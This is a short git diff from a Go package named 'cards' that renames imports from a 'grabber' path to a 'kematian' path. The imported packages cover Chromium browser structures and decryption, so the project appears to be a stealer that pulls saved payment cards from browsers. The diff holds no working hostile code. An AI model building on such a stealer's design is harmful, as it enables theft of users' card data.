@@ -3,9 +3,8 @@ package cards
 import (
 	"database/sql"
 	"encoding/json"
-
-	"kdot/grabber/browsers/chromium/structs"
-	"kdot/grabber/decryption"
+	"kdot/kematian/browsers/chromium/structs"
+	"kdot/kematian/decryption"
 )
 
 type Cards struct {
